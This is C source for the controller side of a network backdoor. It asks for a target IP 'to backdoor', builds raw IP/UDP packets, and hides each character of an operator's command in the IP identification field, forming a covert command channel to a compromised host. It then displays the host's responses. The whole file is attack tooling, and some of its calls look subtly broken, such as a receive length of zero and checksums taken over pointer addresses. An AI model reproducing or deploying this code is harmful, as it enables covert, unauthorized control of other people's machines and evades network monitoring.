#include "attacker.h"

pid_t pid;

int main(void) {
    struct options_attacker opts;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    char buffer[RECEIVE_SIZE] = {0};
    char instruction[64] = {0}, s_buffer[SEND_SIZE] = {0}, t_buffer[SEND_SIZE] = {0};
    char* nic_interface;
    bpf_u_int32 netp;
    bpf_u_int32 maskp;

    struct sockaddr_in victim_address;
    int len = sizeof(victim_address);
    int byte;

    fd_set reads, cpy_reads;
    struct timeval timeout;
    int fd_max, fd_num;

    int exit_flag = 0;

    struct iphdr ih;
    struct udphdr uh;
    size_t size = 0;


    signal(SIGINT,sig_handler);
    options_attacker_init(&opts);
    get_victim_ip(&opts);
    get_gateway_ip(&opts);
    nic_interface = pcap_lookupdev(errbuf);
    get_my_ip(nic_interface, &opts);
    create_attacker_socket(&opts, &victim_address);
    puts("============ Initialize program ============");
    fflush(stdout);

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;

    FD_ZERO(&reads);
    FD_SET(STDIN_FILENO, &reads);
    FD_SET(opts.attacker_socket, &reads);
    fd_max = opts.attacker_socket;

    while (1) {
        if (exit_flag == 1) break;
        cpy_reads = reads;

        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        }
        else if (fd_num == 0) continue; // time out
        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &cpy_reads)) {
                if (i == opts.attacker_socket) {
                    recvfrom(opts.attacker_socket, buffer, strlen(buffer), 0, (struct sockaddr*)&victim_address, &len);
                    printf("[ TARGET RESPONSE ]\n%s\n", buffer);
                    memset(buffer, 0, sizeof(char) * 256);
                }
                if (i == STDIN_FILENO) {
                    if (fgets(opts.victim_instruction, sizeof(opts.victim_instruction), stdin)) {
                        opts.victim_instruction[strlen(opts.victim_instruction) - 1] = 0;
                        if (strcmp(opts.victim_instruction, QUIT) == 0) {
                            sendto(opts.attacker_socket, opts.victim_instruction, strlen(opts.victim_instruction), 0, (const struct sockaddr*)&victim_address, sizeof(victim_address));
                            puts("closing program ...");
                            close(opts.attacker_socket);
                            exit_flag = 1;
                            break;
                        }

                        // TODO: Create RAW PACKET
                        sprintf(instruction, "[[%s]]", opts.victim_instruction);
                        for (int j = 0; j < strlen(instruction); j++) {
                            create_udp_header(&uh);
                            create_ip_header(&ih, instruction[j], &opts);
                            memcpy(s_buffer, &ih, sizeof(struct iphdr));
                            memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
                            byte = sendto(opts.attacker_socket, (const char*)s_buffer, SEND_SIZE, 0, (const struct sockaddr*)&victim_address, sizeof(victim_address));
                            if (byte < 0) {
                                perror("send failed\n");
                            }
                            memset(s_buffer, 0, SEND_SIZE);
                        }
                        memset(instruction, 0, 64);
                    }
                }
            }
        }
    }

    close(opts.attacker_socket);
    return EXIT_SUCCESS;
}


void options_attacker_init(struct options_attacker *opts) {
    memset(opts, 0, sizeof(struct options_attacker));
}


void get_victim_ip(struct options_attacker *opts) {
    uint8_t input_length;

    while (1) {
        printf("Enter [ TARGET IP ] to backdoor: ");
        fflush(stdout);
        fgets(opts->victim_ip, sizeof(opts->victim_ip), stdin);
        input_length = (uint8_t) strlen(opts->victim_ip);
        if (input_length > 0 && opts->victim_ip[input_length - 1] == '\n') {
            opts->victim_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts->victim_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void create_attacker_socket(struct options_attacker *opts, struct sockaddr_in* victim_address) {
    memset(victim_address, 0, sizeof(struct sockaddr_in));
    int enable = 1;

    opts->attacker_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (opts->attacker_socket == -1) {
        perror("socket() ERROR\n");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(opts->attacker_socket, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable)) < 0) {
        perror("Error setting IP_HDRINCL option");
        exit(EXIT_FAILURE);
    }

    victim_address->sin_family = AF_INET;
    victim_address->sin_port = htons(DEFAULT_PORT);
    victim_address->sin_addr.s_addr = inet_addr(opts->victim_ip);

    if (victim_address->sin_addr.s_addr == (in_addr_t) -1) {
        fatal_errno(__FILE__, __func__, __LINE__, errno, 2);
    }
}


void get_my_ip(char *nic_interface, struct options_attacker *opts) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, nic_interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    strcpy(opts->my_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}


void get_gateway_ip(struct options_attacker *opts) {
    FILE* fp = NULL;
    char temp[1024] = {0};
    char* token;

    fp = popen(NETSTAT, "r");
    while (fgets(temp, sizeof(temp), fp) != NULL) {
        // Find the line that contains "0.0.0.0" or "default"
        if (strstr(temp, "0.0.0.0") != NULL || strstr(temp, "default") != NULL) {
            // Extract the gateway IP address
            token = strtok(temp, " ");
            while (token != NULL) {
                if (strcmp(token, "0.0.0.0") == 0 || strcmp(token, "default") == 0) {
                    token = strtok(NULL, " ");
                    strcpy(opts->gateway_ip, token);
                    break;
                }
                token = strtok(NULL, " ");
            }
            break;
        }
    }
    pclose(fp);
}


unsigned short create_udp_header(struct udphdr* uh) {
    uh->source = htons(generate_random_port());
    uh->dest = htons(DEFAULT_PORT);
    uh->len = htons(sizeof(struct udphdr));
    uh->check = calculate_checksum(&uh, sizeof(struct udphdr));

    return sizeof(struct udphdr);
}


unsigned short create_ip_header(struct iphdr* ih, char c, struct options_attacker *opts) {
    ih->ihl = 5;
    ih->version = 4;
    ih->tos = 0;
    ih->id = htons(hide_data((uint16_t)c));
    ih->tot_len = htons(28);
    ih->ttl = 64;
    ih->frag_off = 0;
    ih->protocol = IPPROTO_UDP;
    ih->saddr = host_convert(opts->my_ip);
    ih->daddr = host_convert(opts->victim_ip);
    ih->check = calculate_checksum(&ih, sizeof(struct iphdr));

    return sizeof(struct iphdr);
}


uint16_t generate_random_port(void) {
    int min_port = 1024;
    int max_port = 65535;

    srand((unsigned)time(NULL));
    return (uint16_t) ((rand() % (max_port - min_port + 1)) + min_port);
}


unsigned int host_convert(char *hostname) {
    static struct in_addr i;
    struct hostent *h;
    i.s_addr = inet_addr(hostname);
    if(i.s_addr == -1)
    {
        h = gethostbyname(hostname);
        if(h == NULL)
        {
            fprintf(stderr, "cannot resolve %s\n", hostname);
            exit(0);
        }
        memcpy(h->h_name, (char *)&i.s_addr, (unsigned long) h->h_length);
    }
    return i.s_addr;
}


uint16_t calculate_checksum(void *header, int header_size) {
    uint32_t sum = 0;
    uint16_t *ptr = (uint16_t *)header;

    while (header_size > 1) {
        sum += *ptr++;
        header_size -= 2;
    }

    if (header_size > 0) {
        sum += *(uint8_t *)ptr;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return (uint16_t)~sum;
}
